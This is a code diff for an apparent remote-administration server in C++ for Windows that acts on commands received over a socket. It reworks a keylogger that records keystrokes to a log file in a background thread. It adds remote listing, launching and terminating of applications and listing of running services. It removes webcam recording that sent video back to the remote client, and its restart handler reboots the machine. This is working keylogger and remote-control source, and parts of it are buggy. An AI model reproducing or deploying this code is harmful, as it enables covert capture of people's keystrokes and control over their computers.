@@ -85,6 +85,7 @@ void Server::listenForConnections() {
     }
 }
 
+
 bool Server::captureScreenshot(cv::Mat& outImage) {
 
     // Khởi tạo GDI+
@@ -178,15 +179,31 @@ void Server::handleClient(SOCKET clientSocket) {
                 shutdownServer();
                 exit(0);  // Exit the server program
             }
-            if(receivedMessage == "restart"){
+            else if(receivedMessage == "restart"){
                 std::cout << "Restart command received. Server is restarting..." << std::endl;
                 closesocket(listenSocket);  // Close listening socket to stop accepting new connections
                 restartServer();
                 exit(0);  // Exit the server program
-            }
-            if(receivedMessage == "keylogger"){
+            } else if (receivedMessage == "startKeylogger") {
                 std::cout << "Keylogger command received." << std::endl;
-                keyLogger(clientSocket);
+                startKeyLogger();
+            } else if (receivedMessage == "offKeylogger") {
+                std::cout << "Keylogger stop command received." << std::endl;
+                stopKeyLogger(clientSocket);
+            } else if (receivedMessage == "listApp"){
+                std::cout << "List app command received." << std::endl;
+                listApplications(clientSocket);
+            } else if(receivedMessage.substr(0, 7) == "openApp"){
+                std::cout << "Open app command received." << std::endl;
+                std::string appNameStr = receivedMessage.substr(8);
+                openProcess(appNameStr, clientSocket);
+            } else if(receivedMessage.substr(0, 8) == "closeApp"){
+                std::cout << "Close app command received." << std::endl;
+                DWORD processID = stoi(receivedMessage.substr(9));
+                closeProcess(processID, clientSocket);
+            } else if(receivedMessage == "listService"){
+                std::cout << "List service command received." << std::endl;
+                listServices(clientSocket);
             }
             else if (receivedMessage == "screenshot")
             {
@@ -305,7 +322,6 @@ void Server::shutdownServer() {
     WSACleanup();
 }
 
-
 void Server::restartServer(){
     // Execute Windows shutdown command
     int result = system("shutdown /r /t 0");
@@ -318,244 +334,257 @@ void Server::restartServer(){
     WSACleanup();
 }
 
-
-// Check if a key is currently pressed
-bool isKeyPressed(int vkCode) {
-    return GetAsyncKeyState(vkCode) & 0x8000;
+//Keylogger
+void Server::startKeyLogger() {
+    isLogging = true;
+    if (!keyLoggerThread.joinable()) 
+        keyLoggerThread = std::thread(&Server::keyLogger, this);
+        std::cout << "Keylogger started.\n";
+}
+// Function to stop keylogger and send log file to client
+void Server::stopKeyLogger(SOCKET clientSocket) {
+    isLogging = false;
+    if (keyLoggerThread.joinable()) 
+        keyLoggerThread.join();    
 }
 
-// Map numbers to their shift-modified symbols
-char getShiftedSymbol(int vkCode, bool shiftPressed) {
-    switch (vkCode) {
-        case '1': return shiftPressed ? '!' : '1';
-        case '2': return shiftPressed ? '@' : '2';
-        case '3': return shiftPressed ? '#' : '3';
-        case '4': return shiftPressed ? '$' : '4';
-        case '5': return shiftPressed ? '%' : '5';
-        case '6': return shiftPressed ? '^' : '6';
-        case '7': return shiftPressed ? '&' : '7';
-        case '8': return shiftPressed ? '*' : '8';
-        case '9': return shiftPressed ? '(' : '9';
-        case '0': return shiftPressed ? ')' : '0';
-
-        // OEM keys and punctuation
-        case VK_OEM_1: return shiftPressed ? ':' : ';';  // VK_OEM_1
-        case VK_OEM_7: return shiftPressed ? '"' : '\''; // VK_OEM_7
-        case VK_OEM_3: return shiftPressed ? '~': '`';
-        case VK_OEM_2: return shiftPressed ? '?' : '/';  // VK_OEM_2
-        case VK_OEM_4: return shiftPressed ? '{' : '[';  // VK_OEM_4
-        case VK_OEM_6: return shiftPressed ? '}' : ']';  // VK_OEM_6
-        case VK_OEM_5: return shiftPressed ? '|' : '\\'; // VK_OEM_5
-        case VK_OEM_PERIOD: return shiftPressed ? '>' : '.';  // VK_OEM_PERIOD
-        case VK_OEM_COMMA: return shiftPressed ? '<' : ',';  // VK_OEM_COMMA
-        case VK_OEM_MINUS: return shiftPressed ? '_' : '-';
-        case VK_OEM_PLUS: return shiftPressed ? '+' : '='; 
-
-        default: return static_cast<char>(vkCode);  // Return the key as-is if no mapping
-    }
-}
-
-void Server::readKey(int _key, SOCKET clientSocket) {
-    if(_key == 160)
+void Server::keyLogger() {
+    std::ofstream outputFile("log.txt", std::ios::app);  // Open file in append mode
+    if (!outputFile.is_open()) {
+        std::cerr << "Failed to open log file for writing.\n";
         return;
-    char output[1024];
-    output[0] = '\0';
-    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-    bool shiftPressed = isKeyPressed(VK_SHIFT);
-    
-    if (_key >= 'A' && _key <= 'Z') {
-        bool uppercase = capsLock ^ shiftPressed;  // XOR logic: only one is true
-        output[0] = uppercase ? static_cast<char>(_key) : static_cast<char>(_key + 32);
-        output[1] = '\0';
-    } else if ((_key >= '0' && _key <= '9') || (_key >= 186 && _key <= 222)) {
-        // Use the new getShiftedSymbol function for numbers and symbols
-        output[0] = getShiftedSymbol(_key, shiftPressed);
-        output[1] = '\0';
-    }else if (_key >= 112 && _key <= 123) {  // Function keys F1-F12
-        sprintf(output, "[F%d]", _key - 111);  // Map 112-123 to F1-F12
-    } else {
-        // Handle other keys (e.g., space, enter, arrows)
-        switch (_key) {
-            case VK_SPACE: strcpy(output, "[SPACE]"); break;
-            case VK_RETURN: strcpy(output, "[ENTER]"); break;
-            case VK_TAB: strcpy(output, "[TAB]"); break;
-            case VK_BACK: strcpy(output, "[BACKSPACE]"); break;
-            case VK_ESCAPE: strcpy(output, "[ESCAPE]"); break;
-            case VK_CONTROL: strcpy(output, "[CTRL]"); break;
-            case VK_MENU: strcpy(output, "[ALT]"); break;
-            case VK_CAPITAL: strcpy(output, "[CAPS LOCK]"); break;
-            case VK_SHIFT: strcpy(output, "[SHIFT]"); break;
-            case VK_LEFT: strcpy(output, "[LEFT ARROW]"); break;
-            case VK_RIGHT: strcpy(output, "[RIGHT ARROW]"); break;
-            case VK_UP: strcpy(output, "[UP ARROW]"); break;
-            case VK_DOWN: strcpy(output, "[DOWN ARROW]"); break;
-            default:
-                if (_key >= 33 && _key <= 126) {
-                    output[0] = static_cast<char>(_key);
-                    output[1] = '\0';
-                }
-                break;
-        }
     }
-    send(clientSocket, output, static_cast<int>(strlen(output)), 0);
-   
-}
 
+    std::map<int, std::string> keyMap = {
+        {VK_BACK, "[BACKSPACE]"},
+        {VK_RETURN, "[ENTER]"},
+        {VK_TAB, "[TAB]"},
+        {VK_ESCAPE, "[ESCAPE]"},
+        {VK_CONTROL, "[CTRL]"},
+        {VK_MENU, "[ALT]"},
+        {VK_SPACE, "[SPACE]"},
+        {VK_CAPITAL, "[CAPSLOCK]"},
+        {VK_SHIFT, "[SHIFT]"}
+    };
 
-void Server::keyLogger(SOCKET clientSocket) {
-    std::cout << "Press CTRL + ESC to exit the program.\n";
-    while (true) {
-        Sleep(10);  // Reduce CPU usage
+    while (isLogging) {
+        Sleep(10);
         for (int i = 8; i <= 255; i++) {
-            if (GetAsyncKeyState(i) == -32767) {  // Key press detected
-                if (i == VK_ESCAPE) {
-                    std::cout << "Exiting...\n";
-                    return;  // Exit the function, which stops the program
-                }       
-                readKey(i, clientSocket);  // Process and print the key
-            }
-        }
-    }
-}
-
-void Server::openWebcam(SOCKET clientSocket) {
-    cv::VideoCapture webcam(0); // Open default camera (usually 0)
-    
-    if (!webcam.isOpened()) {
-        std::string errorMessage = "Failed to open webcam.";
-        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
-        std::cerr << "Error: " << errorMessage << std::endl;
-        return;
-    }
-
-    std::string successMessage = "Webcam opened successfully.";
-    send(clientSocket, successMessage.c_str(), static_cast<int>(successMessage.size()), 0);
-    std::cout << successMessage << std::endl;
-
-    char recvbuf[512];
-    int recvbuflen = 512;
-    cv::Mat frame;
-    while (true) {
-        webcam >> frame; // Capture a new frame
-        if (frame.empty()) break; // Check if frame is empty
-        cv::imshow("Webcam Feed", frame); // Display the frame
-
-        // Receive data from the client
-        int result = recv(clientSocket, recvbuf, recvbuflen, 0);
-        if (result > 0)
-        {
-            std::string receivedmessage(recvbuf, result);
-
-            if (receivedmessage == "close_webcam")
-            {
-                std::cout << "Closing webcam..." << std::endl;
-                break;
-            }
-            else if (receivedmessage == "start_webcam")
-            {
-                std::thread startRecordingThread(&Server::startRecording, this, webcam, clientSocket);
-                std::cout << "Waiting for stop recording demand...";
-                result = -1;
-                while (result < 0)
-                {
-                    result = recv(clientSocket, recvbuf, recvbuflen, 0);
+           if (GetAsyncKeyState(i) == -32767) {
+                std::lock_guard<std::mutex> lock(logMutex);
+                // Check if the key is in the special key map
+                auto it = keyMap.find(i);
+                if (it != keyMap.end()) {
+                    outputFile << it->second;  //Dpecial keys
+                } else {
+                    if ((i >= 0x30 && i <= 0x39) ||    // Numbers 0-9
+                            (i >= 0x41 && i <= 0x5A)) {  // Letters A-Z and a-z
+                            outputFile << static_cast<char>(i);
+                        }
+                        break;
                 }
-
-                std::string stopmessage(recvbuf, result);
-                if (stopmessage == "stop_webcam")
-                {
-                    {
-                        std::lock_guard<std::mutex> lock(mtx);
-                        stoprecording = true;
-                    }
-                    CV.notify_one();
-                    startRecordingThread.join();
-                    stopRecording(clientSocket);
-                    break;
-                    std::cin.ignore();
-                }
+                outputFile.flush();  // Flush after each keystroke
             }
         }
-
-        // You may want to send this frame to the client
-        // (Add your frame sending logic here if needed)
-        if (cv::waitKey(30) >= 0) break; // Break loop on key press
     }
-
-    webcam.release(); // Release the camera
-    cv::destroyAllWindows(); // Close any OpenCV windows
-
+    outputFile.close();  
 }
 
-void Server::startRecording(cv::VideoCapture& webcam, SOCKET clientSocket)
-{
-    cv::VideoWriter videoWriter;
-    videoWriter.open("Video.mp4", cv::VideoWriter::fourcc('H', '2', '6', '4'), 30, cv::Size(640, 480));
-    
-    if (!videoWriter.isOpened())
-    {
-        std::cerr << "Failed to open video writer." << std::endl;
+bool Server::isBackgroundProcess(const wchar_t* processName) {
+    std::vector<std::wstring> backgroundProcesses{
+        L"TextInputHost.exe", L"SystemSettings.exe",
+        L"powershell.exe", L"ApplicationFrameHost.exe"
+    };
+
+    for (const auto& str : backgroundProcesses) {
+        if (str == processName) {
+            return true;
+        }
+    }
+    return false;
+}
+
+bool Server::hasVisibleWindow(const int processID) {
+    HWND hwnd = GetTopWindow(NULL);
+    while (hwnd) {
+        DWORD windowProcessID;
+        GetWindowThreadProcessId(hwnd, &windowProcessID);
+        if (windowProcessID == processID && IsWindowVisible(hwnd)) {
+            return true;
+        }
+        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
+    }
+    return false;
+}
+
+//List app https://stackoverflow.com/questions/77231403/get-a-list-of-open-application-windows-in-c-windows
+void Server::listApplications(SOCKET clientSocket) {
+    HANDLE hProcessSnap;
+    PROCESSENTRY32 pe32;
+    std::ofstream outfile("applications.txt");
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to take a snapshot of the processes." << std::endl;
         return;
     }
 
-    char recvbuf[512];
-    int recvbuflen = 512;
-    cv::Mat frame;
-    while (true)
-    {
-        {
-            std::unique_lock<std::mutex> lock(mtx);
-            if (CV.wait_for(lock, std::chrono::milliseconds(5), []{ return stoprecording.load(); })) {
-                break;
-            }
-        }
-        webcam >> frame;
-        if (frame.empty()) break;
-        videoWriter.write(frame);
-        cv::waitKey(30);
-    }
-    if (videoWriter.isOpened()) videoWriter.release();
-}
+    pe32.dwSize = sizeof(PROCESSENTRY32);
 
-void Server::stopRecording(SOCKET clientSocket)
-{
-    std::cout << "Recording stopped." << std::endl;
-
-    std::ifstream videoFile("Video.mp4", std::ios::binary);
-    if (!videoFile)
-    {
-        std::string message = "Failed to open recorded video.";
-        send(clientSocket, message.c_str(), static_cast<int>(message.size()), 0);
-        std::cerr << "Failed to open recorded video." << std::endl;
+    if (!Process32First(hProcessSnap, &pe32)) {
+        std::cerr << "Failed to retrieve information for the first process." << std::endl;
+        CloseHandle(hProcessSnap);
         return;
     }
-    
-    std::string message = "Opened file Video.mp4.";
-    send(clientSocket, message.c_str(), static_cast<int>(message.size()), 0);
+    auto timenow = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()); 
+    outfile << "Current time:" << ctime(&timenow) << std::endl;
+    outfile << "Application name" << std::setw(35) << "Process ID" << std::endl;
+    outfile << "---------------------------------------------------\n";
+    do {
+        wchar_t wideExeFile[MAX_PATH];
+        MultiByteToWideChar(CP_ACP, 0, pe32.szExeFile, -1, wideExeFile, MAX_PATH);
+        if (isBackgroundProcess(wideExeFile))
+            continue;
+        if (hasVisibleWindow(pe32.th32ProcessID)) {
+            outfile << std::left << std::setw(42)
+                <<  pe32.szExeFile  // Service name
+                << std::right << pe32.th32ProcessID  // Process ID
+                << std::endl;
+        }
+    } while (Process32Next(hProcessSnap, &pe32));
 
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-
-    videoFile.seekg(0, std::ios::end);
-    std::streamsize fileSize = videoFile.tellg();
-    videoFile.seekg(0, std::ios::beg);
-
-    // Send the file size
-    uint32_t fileSizeNetworkOrder = htonl(static_cast<uint32_t>(fileSize));
-    send(clientSocket, reinterpret_cast<const char*>(&fileSizeNetworkOrder), sizeof(fileSizeNetworkOrder), 0);
-
-    std::this_thread::sleep_for(std::chrono::milliseconds(100));
-
-    // Send the video data
-    char buffer[4096];
-    while (videoFile.read(buffer, sizeof(buffer))) {
-        send(clientSocket, buffer, static_cast<int>(videoFile.gcount()), 0);
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    }
-    // Send any remaining bytes
-    if (videoFile.gcount() > 0) {
-        send(clientSocket, buffer, static_cast<int>(videoFile.gcount()), 0);
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));
-    }
-
-    videoFile.close();
+    CloseHandle(hProcessSnap);
+    outfile.close();
 }
+
+//open/close app https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes?redirectedfrom=MSDN
+void Server::openProcess(const std::string& appName, SOCKET clientSocket)
+{
+    HINSTANCE hInstance = ShellExecute(
+        NULL,           // No parent window
+        "open",         // Action to perform
+        appName.c_str(),// Application name
+        NULL,           // No parameters
+        NULL,           // Default directory
+        SW_SHOWNORMAL   // Show the application window normally
+    );
+
+    if ((INT_PTR)hInstance <= 32) {
+        // Error handling if ShellExecute fails
+        std::string errorMessage = "Failed to open application: " + appName;
+        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        std::cerr << "ShellExecute failed with error code: " << (INT_PTR)hInstance << std::endl;
+    } else {
+        std::string message = "Successfully opened " + appName;
+        send(clientSocket, message.c_str(), message.size(), 0);
+    }
+}
+
+void Server::closeProcess(const int processId, SOCKET clientSocket) //chatgpt
+{
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+    if (hProcess == NULL) {
+        std::string errorMessage = "Failed to open process with ID: " + std::to_string(processId);
+        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        std::cerr << "OpenProcess failed with error code: " << GetLastError() << std::endl;
+        return;
+    }
+
+    // Terminate the process
+    if (!TerminateProcess(hProcess, 0)) {
+        std::string errorMessage = "Failed to terminate process with ID: " + std::to_string(processId);
+        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        std::cerr << "TerminateProcess failed with error code: " << GetLastError() << std::endl;
+    } else {
+        std::string message = "Successfully terminated process with ID: " + std::to_string(processId);
+        send(clientSocket, message.c_str(), message.size(), 0);
+    }
+
+    // Close the handle to the process
+    CloseHandle(hProcess);
+}
+//List services
+void Server::listServices(SOCKET clientSocket){
+        SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
+        if (!scmHandle) {
+            std::cerr << "Failed to open Service Control Manager." << std::endl;
+            return;
+        }
+        
+        // Define variables to hold service information
+        DWORD bytesNeeded = 0, serviceCount = 0;
+        DWORD resumeHandle = 0;
+        ENUM_SERVICE_STATUS_PROCESS* serviceStatus = nullptr;
+
+        // Query the number of services
+        EnumServicesStatusEx(
+            scmHandle,
+            SC_ENUM_PROCESS_INFO,
+            SERVICE_WIN32,
+            SERVICE_STATE_ALL,
+            nullptr,
+            0,
+            &bytesNeeded,
+            &serviceCount,
+            &resumeHandle,
+            nullptr
+        );
+
+        // Allocate memory for the service information
+        serviceStatus = (ENUM_SERVICE_STATUS_PROCESS*)malloc(bytesNeeded);
+        if (!serviceStatus) {
+            std::cerr << "Memory allocation failed." << std::endl;
+            CloseServiceHandle(scmHandle);
+            return;
+        }
+
+        // Retrieve the list of services
+        if (!EnumServicesStatusEx(
+            scmHandle,
+            SC_ENUM_PROCESS_INFO,
+            SERVICE_WIN32,
+            SERVICE_STATE_ALL,
+            (LPBYTE)serviceStatus,
+            bytesNeeded,
+            &bytesNeeded,
+            &serviceCount,
+            &resumeHandle,
+            nullptr
+        )) {
+            std::cerr << "Failed to enumerate services." << std::endl;
+            free(serviceStatus);
+            CloseServiceHandle(scmHandle);
+            return;
+        }
+        std::ofstream outfile("ListOfServices.txt");
+        if(!outfile.is_open()){
+            std::cout << "cannot open file";
+            free(serviceStatus);
+            CloseServiceHandle(scmHandle);
+            return;
+        }
+
+
+        // Loop through the services and print the ones that are running
+          // Determine the maximum width for service names
+        auto timenow = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()); 
+        outfile << "Current time:" << ctime(&timenow) << std::endl;
+        outfile << "Services name" << std::setw(35) << "Process ID" << std::endl;
+        outfile << "---------------------------------------------------\n";
+        for (DWORD i = 0; i < serviceCount; ++i) {
+            if (serviceStatus[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) {
+             
+                outfile << std::left << std::setw(42)
+                << serviceStatus[i].lpServiceName  // Service name
+                << std::right << serviceStatus[i].ServiceStatusProcess.dwProcessId  // Process ID
+                << std::endl;
+            }
+        }
+
+        // Clean up
+        free(serviceStatus);
+        CloseServiceHandle(scmHandle);
+        outfile.close();
+       
+}
+//open/close services
